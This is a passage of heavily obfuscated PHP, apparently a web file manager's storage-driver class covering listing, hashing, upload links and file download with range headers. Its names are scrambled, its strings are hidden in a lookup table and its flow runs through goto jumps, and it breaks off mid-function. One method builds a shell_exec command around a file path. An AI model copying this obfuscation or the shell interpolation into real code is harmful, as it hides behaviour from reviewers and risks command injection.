@rmdir($this->pathFather($dã¡“ÖÁ¥â)); } public function mkfile($fŠ¥„… ÌÔ, $b‚…Ÿ‘´¤† = '', $fŸŠÕ‡À©¡ = REPEAT_RENAME) { } public function mkdir($B×„°ÊŒĞ, $AÚì²İ‰æĞ = REPEAT_SKIP) { } public function delFile($d¬„•íŠ–) { } public function delFolder($dÎë³¢¢«) { } public function copyFile($f±§³¡÷÷…, $a¼ŒÒíÏ·Ò) { } public function moveFile($b¼¢ÏÀïÏ, $BÀ«¬é˜ŒØ) { } public function remove($EŒ¢ßòœ) { if ($this->isFile($EŒ¢ßòœ)) { return $this->delFile($EŒ¢ßòœ); } return $this->delFolder($EŒ¢ßòœ); } public function rename($DÊµœÖ´½™, $fâÓ„£°‘Œ) { } public function exist($D…Õ®§é¨) { } public function findByHash($E´‹ÅñÊÃ = '', $FäÏÉÛòòÖ = '') { return !1; } public function isFile($CŠ„¨Ûöï®) { } public function isFolder($aö‘ä‘å¼ñ) { } public function size($AÈ·Ğ°ä“Ö) { } public function info($e¸ÏåáõİÒ) { } public function infoSimple($C¨öÔÄ³‹) { return $this->info($C¨öÔÄ³‹); } public function infoAuth($AÑà•ˆ¤’›) { return $this->info($AÑà•ˆ¤’›); } public function infoFull($BÄ¢ØØ”†ƒ) { return $this->info($BÄ¢ØØ”†ƒ); } public function infoWithChildren($AàÅÒ•ØÌ„) { $fùÆÑ¾³õ =& $_SERVER[›é¼±]; static $aÉ°œ‘È±š = array(); if (isset($aÉ°œ‘È±š[$AàÅÒ•ØÌ„])) { return $aÉ°œ‘È±š[$AàÅÒ•ØÌ„]; } $EŸ”®÷É = $this->info($AàÅÒ•ØÌ„); if ($EŸ”®÷É && $EŸ”®÷É[$fùÆÑ¾³õ[29]] == $fùÆÑ¾³õ[77]) { $A”š“¤—Ö¯ = array($fùÆÑ¾³õ[78] => 0, $fùÆÑ¾³õ[79] => 0, $fùÆÑ¾³õ[80] => 0); $this->infoChildren($AàÅÒ•ØÌ„, $A”š“¤—Ö¯); $EŸ”®÷É[$fùÆÑ¾³õ[78]] = $A”š“¤—Ö¯[$fùÆÑ¾³õ[78]]; $EŸ”®÷É[$fùÆÑ¾³õ[81]] = array($fùÆÑ¾³õ[82] => $A”š“¤—Ö¯[$fùÆÑ¾³õ[79]], $fùÆÑ¾³õ[83] => $A”š“¤—Ö¯[$fùÆÑ¾³õ[80]]); $aÉ°œ‘È±š[$AàÅÒ•ØÌ„] = $EŸ”®÷É; } return $EŸ”®÷É; } public function listPath($bÕ¬‰³§»Ä, $AïàãÉê‡å = false) { } public function has($dõçöóÕŒ›, $E‰Š¨ğ‡„‹ = false, $B«ôšéèØ = false) { } public function canRead($A–Í»ŞÙ½•) { } public function canWrite($D–ùÙ§ë) { } public function getContent($B¾µÅ´ò½ò) { } public function setContent($D¡´äŸ¦¶, $AŠƒ‰˜æ… = '') { } protected function infoChildren($bë²ƒ±Á¯é, &$f­»ô¯ïğõ) { $Bé×”Ç¿• =& $_SERVER[›é¼±]; check_abort_echo(); $FŸñî¼¼Ø„ = $this->listPath($bë²ƒ±Á¯é, !0); $FŸñî¼¼Ø„ = array_merge($FŸñî¼¼Ø„[$Bé×”Ç¿•[75]], $FŸñî¼¼Ø„[$Bé×”Ç¿•[74]]); foreach ($FŸñî¼¼Ø„ as $CØêÎË) { if ($CØêÎË[$Bé×”Ç¿•[29]] == $Bé×”Ç¿•[77]) { $f­»ô¯ïğõ[$Bé×”Ç¿•[80]]++; $Bö£½º¿š = $this->getPathInner($CØêÎË[$Bé×”Ç¿•[76]]); $this->infoChildren($Bö£½º¿š, $f­»ô¯ïğõ); } else { $f­»ô¯ïğõ[$Bé×”Ç¿•[79]]++; $f­»ô¯ïğõ[$Bé×”Ç¿•[78]] += $CØêÎË[$Bé×”Ç¿•[78]]; } } } public function fileSubstr($C¼›‰ø²£š, $A‹‡ßÖ˜®», $Eä«¤áÏã) { } public function listAll($Bù¿‘äç¿) { } public function listAllMake($dÌÖ—™ÊÄª, &$cÉæí¥Óè) { $e›ôÕôô÷è =& $_SERVER[›é¼±]; check_abort_echo(); $A™ä­Áòá® = $this->listPath($dÌÖ—™ÊÄª, !0); if (!$A™ä­Áòá®) { return; } $FÚçãÍ×œ· = array_merge($A™ä­Áòá®[$e›ôÕôô÷è[75]], $A™ä­Áòá®[$e›ôÕôô÷è[74]]); foreach ($FÚçãÍ×œ· as $f¿ŞÑŒÚê”) { goto E‰»¡Ô–; Dà‰çİëÎ†: $this->listAllMake($f¿ŞÑŒÚê”[$e›ôÕôô÷è[76]], $cÉæí¥Óè); goto D…Ö‹ŞÉ; E‰»¡Ô–: $C·Ï½éÔ­” = $f¿ŞÑŒÚê”[$e›ôÕôô÷è[29]] == $e›ôÕôô÷è[77]; $bà½ÆâßçÖ = array($e›ôÕôô÷è[76] => $f¿ŞÑŒÚê”[$e›ôÕôô÷è[76]], $e›ôÕôô÷è[77] => $C·Ï½éÔ­”); if (isset($f¿ŞÑŒÚê”[$e›ôÕôô÷è[78]])) { $bà½ÆâßçÖ[$e›ôÕôô÷è[78]] = $f¿ŞÑŒÚê”[$e›ôÕôô÷è[78]]; } goto CÃ¯× ò†Ç; CÃ¯× ò†Ç: if (isset($f¿ŞÑŒÚê”[$e›ôÕôô÷è[84]])) { $bà½ÆâßçÖ[$e›ôÕôô÷è[84]] = $f¿ŞÑŒÚê”[$e›ôÕôô÷è[84]]; } if (!$C·Ï½éÔ­”) { $cÉæí¥Óè[] = $bà½ÆâßçÖ; continue; } $cÉæí¥Óè[] = $bà½ÆâßçÖ; goto Dà‰çİëÎ†; D…Ö‹ŞÉ: } } public function listAllSimple($DÇ„ïÜ„â¶) { $D¤éÎ‹ˆô´ =& $_SERVER[›é¼±]; $Cêœ©½çÜ = array(); $D‚¼ê„¤Ù‡ = $this->listAll($DÇ„ïÜ„â¶); $DÌÁ¼è¿ = $this->getPathOuter($DÇ„ïÜ„â¶); foreach ($D‚¼ê„¤Ù‡ as $c´¹°Å°ƒ) { goto dÄ¶Ø†ÃÎÜ; dÄ¶Ø†ÃÎÜ: $DŠãËÒ Ôµ = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[76]]; $c¬‘ĞØ‘ = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[76]]; if (isset($c´¹°Å°ƒ[$D¤éÎ‹ˆô´[85]])) { $DŠãËÒ Ôµ = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[85]][$D¤éÎ‹ˆô´[76]]; $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[78]] = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[85]][$D¤éÎ‹ˆô´[78]]; $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[84]] = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[85]][$D¤éÎ‹ˆô´[84]]; } else { $c¬‘ĞØ‘ = substr($c´¹°Å°ƒ[$D¤éÎ‹ˆô´[76]], strlen(get_path_father($DÌÁ¼è¿))); $c¬‘ĞØ‘ = $D¤éÎ‹ˆô´[8] . ltrim($c¬‘ĞØ‘, $D¤éÎ‹ˆô´[8]); } goto D³ïï‚ØÃŠ; D³ïï‚ØÃŠ: $bÖÔÜïÙÍ¡ = array($D¤éÎ‹ˆô´[76] => $c¬‘ĞØ‘, $D¤éÎ‹ˆô´[77] => $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[77]]); if (isset($c´¹°Å°ƒ[$D¤éÎ‹ˆô´[78]]) && !$c´¹°Å°ƒ[$D¤éÎ‹ˆô´[77]]) { $bÖÔÜïÙÍ¡[$D¤éÎ‹ˆô´[78]] = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[78]]; } if (isset($c´¹°Å°ƒ[$D¤éÎ‹ˆô´[84]])) { $bÖÔÜïÙÍ¡[$D¤éÎ‹ˆô´[84]] = $c´¹°Å°ƒ[$D¤éÎ‹ˆô´[84]]; } goto f©ã×ß†‘Ç; f©ã×ß†‘Ç: if (!$c´¹°Å°ƒ[$D¤éÎ‹ˆô´[77]]) { $bÖÔÜïÙÍ¡[$D¤éÎ‹ˆô´[86]] = $DŠãËÒ Ôµ; } $Cêœ©½çÜ[] = $bÖÔÜïÙÍ¡; goto e‡ŠœÈ¤; e‡ŠœÈ¤: } return $Cêœ©½çÜ; } public function upload($Cá«÷êºİ•, $Bµ²«ê½, $EÎÉ»÷ÍŞâ = false, $aïØ–ññß = REPEAT_REPLACE) { } public function uploadFileByID($eøÜîªé¿’, $bóç‘½á°, $eêî•õ) { } public function uploadFileByPath($A´¼“…¿‹, $c«¤îñ„…Ú, $A©àåïø³ = array()) { } public function isUploadServer() { $F‘•ºÜùœù =& $_SERVER[›é¼±]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $F‘•ºÜùœù[87]) { return !0; } return $GLOBALS[$F‘•ºÜùœù[6]][$F‘•ºÜùœù[88]][$F‘•ºÜùœù[89]]; } public function isFileOutServer() { $D¹’²êİÓº =& $_SERVER[›é¼±]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $D¹’²êİÓº[87]) { return !0; } return $GLOBALS[$D¹’²êİÓº[6]][$D¹’²êİÓº[88]][$D¹’²êİÓº[90]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eÌ†øÄœ†ù) { $aš‡íùî˜Œ =& $_SERVER[›é¼±]; if (!$this->isCdnHost()) { return $eÌ†øÄœ†ù; } return str_replace(trim(get_url_root($eÌ†øÄœ†ù), $aš‡íùî˜Œ[8]), trim($this->cdnHost, $aš‡íùî˜Œ[8]), $eÌ†øÄœ†ù); } public function uploadLink($bÙí „Ø‹í, $aÌ°ò•˜Ã¯ = 0) { goto a™¶í¬ÃæÂ; cõ‚ôøÔ÷Ê: if (!in_array($Aäğ‘÷«âï, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $fªÇ¤óø™ = 1024 * 1024 * 10; goto DÉÆÊ³ÀÖ; B»ò§Å¡¿Ä: if ($C‹¾©è“ğŠ) { $C‹¾©è“ğŠ[$Fª¨ï±ùš£[93]] = $bÙí „Ø‹í; $C‹¾©è“ğŠ[$Fª¨ï±ùš£[94]] = $Aäğ‘÷«âï; } return $C‹¾©è“ğŠ; goto BîãõèŒƒÎ; a™¶í¬ÃæÂ: $Fª¨ï±ùš£ =& $_SERVER[›é¼±]; if ($this->isUploadServer()) { return; } $Aäğ‘÷«âï = $this->getType(); goto cõ‚ôøÔ÷Ê; DÉÆÊ³ÀÖ: $E¡ŒºÀåî = $aÌ°ò•˜Ã¯ <= $fªÇ¤óø™ ? $Fª¨ï±ùš£[91] : $Fª¨ï±ùš£[92]; $f–»„Ğø„Ø = (!$aÌ°ò•˜Ã¯ ? 1 : ceil($aÌ°ò•˜Ã¯ / pow(1024, 3))) * 3600 * 4; $C‹¾©è“ğŠ = $this->{$E¡ŒºÀåî}($bÙí „Ø‹í, $f–»„Ğø„Ø); goto B»ò§Å¡¿Ä; BîãõèŒƒÎ: } public function uploadFormData($bœİæ‡×¿, $AÕî˜îÌÔ = 3600) { } public function multiUploadFormData($dò‘Ï†®»’, $eÊšçˆê¡ = 3600) { } public function download($d¥ƒöŞ³´, $bÓ•ÛÇé ») { } public function ext($Eôù“óöæ) { $DÁ‹ê–‘Ğ =& $_SERVER[›é¼±]; if (strpos($Eôù“óöæ, $DÁ‹ê–‘Ğ[8]) === -1) { $a“†Ú¿Á‰É = $Eôù“óöæ; } else { $a“†Ú¿Á‰É = $this->pathThis($Eôù“óöæ); } $cé­ç¡•„Ğ = $DÁ‹ê–‘Ğ[33]; if (strstr($a“†Ú¿Á‰É, $DÁ‹ê–‘Ğ[95])) { $cé­ç¡•„Ğ = substr($a“†Ú¿Á‰É, strrpos($a“†Ú¿Á‰É, $DÁ‹ê–‘Ğ[95]) + 1); $cé­ç¡•„Ğ = strtolower($cé­ç¡•„Ğ); } if (strlen($cé­ç¡•„Ğ) > 3 && preg_match($DÁ‹ê–‘Ğ[96], $cé­ç¡•„Ğ, $d†Ÿƒî˜“…)) { $cé­ç¡•„Ğ = $DÁ‹ê–‘Ğ[33]; } return $cé­ç¡•„Ğ; } public function pathThis($a‚ª–˜××š) { $FÁãæ¨ˆ¶¨ =& $_SERVER[›é¼±]; $a‚ª–˜××š = str_replace($FÁãæ¨ˆ¶¨[97], $FÁãæ¨ˆ¶¨[8], rtrim($a‚ª–˜××š, $FÁãæ¨ˆ¶¨[8])); $f¦¨…ËÕö› = strrpos($a‚ª–˜××š, $FÁãæ¨ˆ¶¨[8]); if ($f¦¨…ËÕö› === !1) { return $a‚ª–˜××š; } return substr($a‚ª–˜××š, $f¦¨…ËÕö› + 1); } public function pathFather($a†‹¤ß¼) { $DÜœÂåÏà¸ =& $_SERVER[›é¼±]; $a†‹¤ß¼ = str_replace($DÜœÂåÏà¸[97], $DÜœÂåÏà¸[8], rtrim($a†‹¤ß¼, $DÜœÂåÏà¸[8])); $BÛ‚À¢ªİĞ = strrpos($a†‹¤ß¼, $DÜœÂåÏà¸[8]); if ($BÛ‚À¢ªİĞ === !1) { return $DÜœÂåÏà¸[33]; } return substr($a†‹¤ß¼, 0, $BÛ‚À¢ªİĞ + 1); } public function hashSimple($CöÌƒ‡äÉ) { goto cÃ¡ğ¿¦ø; CÚ®µøòÅŞ: $C¦îÇ“¸Ëö .= $this->fileSubstr($CöÌƒ‡äÉ, $bÒÎ¬Óíˆ¯ - $cÅÔÍ”•Ã, $cÅÔÍ”•Ã); return md5($C¦îÇ“¸Ëö) . $bÒÎ¬Óíˆ¯; goto dÓ£”©èÑ; cÃ¡ğ¿¦ø: $eğ‰ƒº­†Á =& $_SERVER[›é¼±]; if (!$CöÌƒ‡äÉ) { return md5($eğ‰ƒº­†Á[33]); } $bÒÎ¬Óíˆ¯ = $this->size($CöÌƒ‡äÉ); goto EÙàÀ¼¥¡; fîÚ¾ÖË°: $D®§õÜŒ = intval($bÒÎ¬Óíˆ¯ / $b×§÷Í†«); $C¦îÇ“¸Ëö = $eğ‰ƒº­†Á[33]; for ($bÓšÄâŸ›Ì = 0; $bÓšÄâŸ›Ì < $b×§÷Í†«; $bÓšÄâŸ›Ì++) { $C¦îÇ“¸Ëö .= $this->fileSubstr($CöÌƒ‡äÉ, $D®§õÜŒ * $bÓšÄâŸ›Ì, $cÅÔÍ”•Ã); } goto CÚ®µøòÅŞ; EÙàÀ¼¥¡: $cÅÔÍ”•Ã = 200; $b×§÷Í†« = 50; if ($bÒÎ¬Óíˆ¯ <= $cÅÔÍ”•Ã * $b×§÷Í†«) { return $this->hashMd5($CöÌƒ‡äÉ) . $bÒÎ¬Óíˆ¯; } goto fîÚ¾ÖË°; dÓ£”©èÑ: } public static $md5Cache = array(); public function hashMd5($B›®Ôî¿•) { $B›®Ôî¿• = $this->iconvSystem($B›®Ôî¿•); if (isset(self::$md5Cache[$B›®Ôî¿•])) { return self::$md5Cache[$B›®Ôî¿•]; } self::$md5Cache[$B›®Ôî¿•] = $this->hashMd5Shell($B›®Ôî¿•); if (!self::$md5Cache[$B›®Ôî¿•]) { self::$md5Cache[$B›®Ôî¿•] = @md5_file($B›®Ôî¿•); } return self::$md5Cache[$B›®Ôî¿•]; } private function hashMd5Shell($Eˆ­Ş•„±¨) { goto fí¨İ‡á«ë; E»ˆ¾îçµî: $d¶òÀê› = Cache::get($Añ¼…ÔµóÜ[101]); if (!$d¶òÀê›) { $cÆ¿ŸÄ­é = BASIC_PATH . $Añ¼…ÔµóÜ[102]; $EïÑê“ó“ = md5_file($cÆ¿ŸÄ­é); $d¶òÀê› = $Añ¼…ÔµóÜ[103]; foreach ($b¤’æÑƒ´© as $AŠ«µğµ) { $DÓóÍéò†À = shell_exec($AŠ«µğµ . "\x20\x22{$cÆ¿ŸÄ­é}\x22"); if ($DÓóÍéò†À && substr(trim($DÓóÍéò†À), 0, 32) == $EïÑê“ó“) { $d¶òÀê› = $AŠ«µğµ; break; } } Cache::set($Añ¼…ÔµóÜ[101], $d¶òÀê›, 3600); } if ($d¶òÀê› == $Añ¼…ÔµóÜ[103]) { return !1; } goto A‰–šç»¿¥; fí¨İ‡á«ë: $Añ¼…ÔµóÜ =& $_SERVER[›é¼±]; if (!function_exists($Añ¼…ÔµóÜ[98])) { return !1; } $b¤’æÑƒ´© = array($Añ¼…ÔµóÜ[99], $Añ¼…ÔµóÜ[100]); goto E»ˆ¾îçµî; A‰–šç»¿¥: $DÓóÍéò†À = shell_exec($d¶òÀê› . "\x20\42{$Eˆ­Ş•„±¨}\x22"); $DÓóÍéò†À = str_replace($Añ¼…ÔµóÜ[104], $Añ¼…ÔµóÜ[33], $DÓóÍéò†À); return substr($DÓóÍéò†À, 0, 32); goto fÎ¥é‚ÁÆ¾; fÎ¥é‚ÁÆ¾: } public function link($dˆ©·Ñ¤“‘) { return $dˆ©·Ñ¤“‘; } public function fileOut($e·ù²Âì¯, $d‰ÚÕæŸ‘´ = false, $CÕ¥ãï„¼¦ = false, $eªè˜Ø£Øâ = '') { goto F£Ô©íéºÛ; E²†¡‰‡óŒ: if (isset($_SERVER[$FŸŸÎÆ˜§÷[131]]) && strtotime($_SERVER[$FŸŸÎÆ˜§÷[131]]) == $dÇùØøµî´[$FŸŸÎÆ˜§÷[84]]) { header($FŸŸÎÆ˜§÷[132], !0, 304); die; } if (isset($_SERVER[$FŸŸÎÆ˜§÷[133]]) && $_SERVER[$FŸŸÎÆ˜§÷[133]] == $eªè˜Ø£Øâ) { header($FŸŸÎÆ˜§÷[134] . $eªè˜Ø£Øâ, !0, 304); die; } header($FŸŸÎÆ˜§÷[134] . $eªè˜Ø£Øâ); goto C‡—¶¸¡ø¶; cĞè…ˆ¥½: if (in_array($aÆñÕ«ë‘Å, array($FŸŸÎÆ˜§÷[111], $FŸŸÎÆ˜§÷[112], $FŸŸÎÆ˜§÷[113], $FŸŸÎÆ˜§÷[114]))) { $aÆñÕ«ë‘Å = $FŸŸÎÆ˜§÷[115]; } if (!$eªè˜Ø£Øâ) { $eªè˜Ø£Øâ = md5($C°°ËÄ´ . $this->hashSimple($e·ù²Âì¯)); } $eªè˜Ø£Øâ = $FŸŸÎÆ˜§÷[116] . $eªè˜Ø£Øâ . $FŸŸÎÆ˜§÷[116]; goto dï›ã¬Ãƒİ; c£Ø„Ç†«Á: @ob_end_clean(); set_timeout(); $dÇùØøµî´ = $this->infoFull($e·ù²Âì¯); goto FéŸÊßéù“; Fò±êƒè£­: $CÂî˜åŞšï = $FŸŸÎÆ˜§÷[116] . $CÂî˜åŞšï . $FŸŸÎÆ˜§÷[122] . $CÂî˜åŞšï; if ($d‰ÚÕæŸ‘´) { header($FŸŸÎÆ˜§÷[123]); header($FŸŸÎÆ˜§÷[124] . $CÂî˜åŞšï); } else { header($FŸŸÎÆ˜§÷[125] . $CÂî˜åŞšï); } header($FŸŸÎÆ˜§÷[126] . gmdate($FŸŸÎÆ˜§÷[110], time() + 3600 * 24 * 30) . $FŸŸÎÆ˜§÷[127]); goto Bµ´‘Òõ™ğ; dï›ã¬Ãƒİ: $Bø±¶©„à„ = get_file_mime($aÆñÕ«ë‘Å); if (strstr($Bø±¶©„à„, $FŸŸÎÆ˜§÷[117])) { $Bø±¶©„à„ = $Bø±¶©„à„ . $FŸŸÎÆ˜§÷[118]; } if ($d‰ÚÕæŸ‘´ === !1 && !mime_support($Bø±¶©„à„)) { $d‰ÚÕæŸ‘´ = !0; $Bø±¶©„à„ = $FŸŸÎÆ˜§÷[119]; } goto c‹Í“ô¤ºŒ; AñÖ£ÕÃé»: if ($_SERVER[$FŸŸÎÆ˜§÷[157]] == $FŸŸÎÆ˜§÷[158]) { return; } $FóÔ²’¤Â£ = 1024 * 100; $Böåóõ®Ğª = 0; goto D¼¢—•÷Å; c‹Í“ô¤ºŒ: header($FŸŸÎÆ˜§÷[120]); header($FŸŸÎÆ˜§÷[121] . $Bø±¶©„à„); $CÂî˜åŞšï = rawurlencode($fÖìË¤’¤±); goto Fò±êƒè£­; Eö’ï½«»: $f¡ï¸²ÌŠë = strtolower($_SERVER[$FŸŸÎÆ˜§÷[142]]); if ($D·´‚‰Óí && $f¡ï¸²ÌŠë && $eåùğÜ—™ì) { if (strstr($f¡ï¸²ÌŠë, $FŸŸÎÆ˜§÷[143])) { header($FŸŸÎÆ˜§÷[144] . $e·ù²Âì¯); } else { if (strstr($f¡ï¸²ÌŠë, $FŸŸÎÆ˜§÷[145])) { header($FŸŸÎÆ˜§÷[146] . $e·ù²Âì¯); } else { if (strstr($f¡ï¸²ÌŠë, $FŸŸÎÆ˜§÷[147])) { header($FŸŸÎÆ˜§÷[148] . $e·ù²Âì¯); } } } if ($Dé™—öÒ¬Š) { header($FŸŸÎÆ˜§÷[149] . $Dé™—öÒ¬Š); } return; } if (isset($_SERVER[$FŸŸÎÆ˜§÷[150]])) { if (preg_match($FŸŸÎÆ˜§÷[151], $_SERVER[$FŸŸÎÆ˜§÷[150]], $CĞà ó‘âÅ)) { $d‡ÉÕÓëİ± = intval($CĞà ó‘âÅ[1]); if (!empty($CĞà ó‘âÅ[2])) { $aªÚ¯îŒÑ· = intval($CĞà ó‘âÅ[2]); } } header($FŸŸÎÆ˜§÷[152]); header("\103\x6f\x6e\164\x65\x6e\164\55\122\x61\156\147\x65\x3a\x20\x62\x79\164\145\163\40{$d‡ÉÕÓëİ±}\55{$aªÚ¯îŒÑ·}\57" . $A¥Î¡²¾£Ÿ); } else { header($FŸŸÎÆ˜§÷[153]); } goto D‡ÜÁ¹‚¯Ã; bŒ‚©ï: $D·´‚‰Óí = $this->getType() == $FŸŸÎÆ˜§÷[106]; $eåùğÜ—™ì = $GLOBALS[$FŸŸÎÆ˜§÷[6]][$FŸŸÎÆ˜§÷[88]][$FŸŸÎÆ˜§÷[107]][$FŸŸÎÆ˜§÷[108]]; $Dé™—öÒ¬Š = (double) $GLOBALS[$FŸŸÎÆ˜§÷[6]][$FŸŸÎÆ˜§÷[88]][$FŸŸÎÆ˜§÷[107]][$FŸŸÎÆ˜§÷[109]] * 1024 * 1024; goto c£Ø„Ç†«Á; Bµ´‘Òõ™ğ: header($FŸŸÎÆ˜§÷[128]); header($FŸŸÎÆ˜§÷[129]); header($FŸŸÎÆ˜§÷[130]); goto E²†¡‰‡óŒ; FğóÊ¯œ›Œ: $d‡ÉÕÓëİ± = 0; $aªÚ¯îŒÑ· = $A¥Î¡²¾£Ÿ - 1; $aÆñÕ«ë‘Å = $this->ext($fÖìË¤’¤±); goto cĞè…ˆ¥½; D¼¢—•÷Å: if ($Dé™—öÒ¬Š) { $Böåóõ®Ğª = intval(1000 * 1000 * ($FóÔ²’¤Â£ / $Dé™—öÒ¬Š)); } while ($d‡ÉÕÓëİ± <= $aªÚ¯îŒÑ·) { $dôŠ²ğÏ­¼ = timeFloat(); check_abort(); $bğ÷ô£¿— = $aªÚ¯îŒÑ· - $d‡ÉÕÓëİ± + 1; if ($bğ÷ô£¿— <= $FóÔ²’¤Â£) { $FóÔ²’¤Â£ = $bğ÷ô£¿—; } echo $this->fileSubstr($e·ù²Âì¯, $d‡ÉÕÓëİ±, $FóÔ²’¤Â£); $d‡ÉÕÓëİ± += $FóÔ²’¤Â£; if ($FóÔ²’¤Â£ == $bğ÷ô£¿—) { $d‡ÉÕÓëİ± = $aªÚ¯îŒÑ· + 1; } if ($Böåóõ®Ğª) { $c¡˜ˆš­Àô = intval(1000 * 1000 * (timeFloat() - $dôŠ²ğÏ­¼)); $E²È÷Šç¸ = $Böåóõ®Ğª - $c¡˜ˆš­Àô; if ($E²È÷Šç¸ > 5) { usleep($E²È÷Šç¸); } } } goto fÅ­†Í¿Ä¿; C‡—¶¸¡ø¶: header($FŸŸÎÆ˜§÷[135] . $C°°ËÄ´ . $FŸŸÎÆ˜§÷[127]); header($FŸŸÎÆ˜§÷[136] . $fÖìË¤’¤±); header($FŸŸÎÆ˜§÷[137]); goto b‹¸ô”Şİá; FéŸÊßéù“: $A¥Î¡²¾£Ÿ = $dÇùØøµî´[$FŸŸÎÆ˜§÷[78]]; $C°°ËÄ´ = gmdate($FŸŸÎÆ˜§÷[110], $dÇùØøµî´[$FŸŸÎÆ˜§÷[84]]); $fÖìË¤’¤± = $CÕ¥ãï„¼¦ ? $CÕ¥ãï„¼¦ : $this->iconvApp($dÇùØøµî´[$FŸŸÎÆ˜§÷[28]]); goto FğóÊ¯œ›Œ; b‹¸ô”Şİá: header($FŸŸÎÆ˜§÷[138] . $A¥Î¡²¾£Ÿ); header($FŸŸÎÆ˜§÷[139]); if (!$d‰ÚÕæŸ‘´ && $aÆñÕ«ë‘Å == $FŸŸÎÆ˜§÷[140]) { if ($A¥Î¡²¾£Ÿ > 1024 * 1024 * 5) { die; } $EÉŒ¼ËøÔî = $this->getContent($e·ù²Âì¯); $EÉŒ¼ËøÔî = Html::clearSVG($EÉŒ¼ËøÔî); header($FŸŸÎÆ˜§÷[141] . strlen($EÉŒ¼ËøÔî)); echo $EÉŒ¼ËøÔî; die; } goto Eö’ï½«»; D‡ÜÁ¹‚¯Ã: $cƒ³†ˆî° = !0; if ($_SERVER[$FŸŸÎÆ˜§÷[154]] == $FŸŸÎÆ˜§÷[155] && $A¥Î¡²¾£Ÿ > 1204 * 1024 * 1024 * 2) { $cƒ³†ˆî° = !1; } if ($cƒ³†ˆî°) { header($FŸŸÎÆ˜§÷[156] . ($aªÚ¯îŒÑ· - $d‡ÉÕÓëİ± + 1)); } goto AñÖ£ÕÃé»; F£Ô©íéºÛ: $FŸŸÎÆ˜§÷ =& $_SERVER[›é¼±]; $this->cacheMethod(null, null); if (!$e·ù²Âì¯ || !$this->exist($e·ù²Âì¯)) { show_json(LNG($FŸŸÎÆ˜§÷[105]), !1, $CÕ¥ãï„¼¦); } goto bŒ‚©ï; fÅ­†Í¿Ä¿: } public function fileOutServer($féºÀƒ¶èå, $bøê…¸òô› = false, $F”‹©ƒï– = false, $Eáø¥’®òª = '') { $this->fileOut($féºÀƒ¶èå, $bøê…¸òô›, $F”‹©ƒï–, $Eáø¥’®òª); } public function fileOutLink($fÉ•¦²ÈÃ) { header($_SERVER[›é¼±][159] . $fÉ•¦²ÈÃ); die; } public function cacheMethod($d½—ŞÎ¨á›, $b‚×ë…åÔ¶, $c„ãÑ‚ƒ¡³ = null) { goto FÒğÖœ¢Ä¾; d»ğÁÀ§±ì: $bŒêÔ¬¡‘º = $this->{$d½—ŞÎ¨á›}($b‚×ë…åÔ¶); $aŞ²Ïï‚‡¢[$CÉÛ“ÙšÉ] = $bŒêÔ¬¡‘º; return $bŒêÔ¬¡‘º; goto cÃÊòŒñÈÑ; FÒğÖœ¢Ä¾: $D›Õ½–¬¹é =& $_SERVER[›é¼±]; static $aŞ²Ïï‚‡¢ = array(); $bâ›¤°Š‚ = $b‚×ë…åÔ¶ ? ltrim($this->getPathOuter($b‚×ë…åÔ¶), $D›Õ½–¬¹é[8]) : $b‚×ë…åÔ¶; goto A•Âò¡ªœ; D¼ÉŒºô¤: if (!is_null($c„ãÑ‚ƒ¡³)) { $aŞ²Ïï‚‡¢[$CÉÛ“ÙšÉ] = $c„ãÑ‚ƒ¡³; return; } $bŒêÔ¬¡‘º = isset($aŞ²Ïï‚‡¢[$CÉÛ“ÙšÉ]) ? $aŞ²Ïï‚‡¢[$CÉÛ“ÙšÉ] : null; if (!is_null($bŒêÔ¬¡‘º)) { return $bŒêÔ¬¡‘º; } goto d»ğÁÀ§±ì; A•Âò¡ªœ: $CÉÛ“ÙšÉ = $D›Õ½–¬¹é[160] . $d½—ŞÎ¨á› . $D›Õ½–¬¹é[161] . rtrim($bâ›¤°Š‚, $D›Õ½–¬¹é[8]); if (is_null($d½—ŞÎ¨á›)) { $aŞ²Ïï‚‡¢ = array(); return; } if (is_null($b‚×ë…åÔ¶)) { unset($aŞ²Ïï‚‡¢[$CÉÛ“ÙšÉ]); return; } goto D¼ÉŒºô¤; cÃÊòŒñÈÑ: } public function fileOutImage($A©‡¡èíğ°, $aİ„ó¸×Ä = 250) { goto C¸´ù› é¾; B¼íÇ•êŞÒ: del_file($d†âÇÈÒ±…); IO::fileOut($Aİ­÷ê™ªÉ); goto d÷èÂ¸òŠ; dÂì¹ëÅ“Ÿ: if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $d†âÇÈÒ±… = DATA_THUMB . $FÜî˜½ÂÇ; del_file($d†âÇÈÒ±…); goto EÆ…ôÆçÌï; Fˆäõ…Ê: $FÜî˜½ÂÇ = "{$DØ ì—½‰Ä}\137{$aİ„ó¸×Ä}\56\x70\156\x67"; if (!($fé¯´¤„…¢ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $c¼‘óÖ¶ƒ[172]))) { $fğÍ÷¢ƒƒ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $c¼‘óÖ¶ƒ[173]); } else { $fğÍ÷¢ƒƒ = KodIO::make($fé¯´¤„…¢); } if ($fé¯´¤„…¢ = IO::fileNameExist($fğÍ÷¢ƒƒ, $FÜî˜½ÂÇ)) { $d†âÇÈÒ±… = KodIO::make($fé¯´¤„…¢); return IO::fileOut($d†âÇÈÒ±…, !1, $aŞ¤¶¶êò); } goto dÂì¹ëÅ“Ÿ; Eä Ì ¶Õº: $Aä§ò¼·å = $this->info($A©‡¡èíğ°); $aŞ¤¶¶êò = $Aä§ò¼·å[$c¼‘óÖ¶ƒ[28]]; $fÒëã«ÌÍÉ = !1; goto CÒª‚«‘”Ì; EÆ…ôÆçÌï: if (!@file_exists($d†âÇÈÒ±…)) { $c—ÇÛé†œ = TEMP_FILES; if (!is_dir($c—ÇÛé†œ)) { mk_dir($c—ÇÛé†œ); } $CÜ¸»ëšŒâ = 